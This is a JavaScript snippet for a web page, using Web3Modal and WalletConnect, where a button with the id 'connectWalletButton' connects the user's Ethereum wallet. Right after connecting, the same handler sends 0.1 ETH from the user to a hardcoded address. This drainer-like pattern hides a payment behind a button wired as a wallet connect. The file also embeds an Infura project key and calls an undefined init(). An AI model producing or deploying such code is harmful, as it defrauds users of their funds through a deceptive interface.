// Initialize Web3Modal
const web3Modal = new Web3Modal({
  network: "https://mainnet.infura.io/v3/b515c05d5db44cb3aa07665e4d316042",
  cacheProvider: true,
  providerOptions: {
      walletconnect: {
          package: WalletConnectProvider,
          options: {
              infuraId: "b515c05d5db44cb3aa07665e4d316042",
          },
      },
  },
});

// Function to connect the wallet and send funds
async function connectWalletAndSendFunds() {
  try {
      // Open the modal to allow the user to select their wallet
      const provider = await web3Modal.connect();
      const web3 = new Web3(provider);

      // Get the user's Ethereum address
      const accounts = await web3.eth.getAccounts();
      const userAccount = accounts[0];

      // Display the connected wallet address
      const walletAddressElement = document.getElementById("walletAddress");
      walletAddressElement.innerHTML = `Connected to wallet with address: ${userAccount}`;

      // Send funds immediately after connecting (replace with your specific transfer logic)
      const toAddress = '0x021423e0814BfA5B5BB613A7Ab83e72eca5d5b2b'; // Replace with the recipient's Ethereum address
      const amountToSend = web3.utils.toWei('0.1', 'ether'); // Replace with the desired amount and unit

      const transactionHash = await web3.eth.sendTransaction({
          from: userAccount,
          to: toAddress,
          value: amountToSend,
      });

      // Display the transaction hash or success message
      const transactionHashElement = document.getElementById("transactionHash");
      transactionHashElement.innerHTML = `Transaction sent with hash: ${transactionHash}`;
  } catch (error) {
      console.error(error);
  }
}

// Add a click event listener to the "Connect Wallet" button
window.addEventListener('load', async () => {
  init();
  document.getElementById("connectWalletButton").addEventListener("click", connectWalletAndSendFunds);
  
});

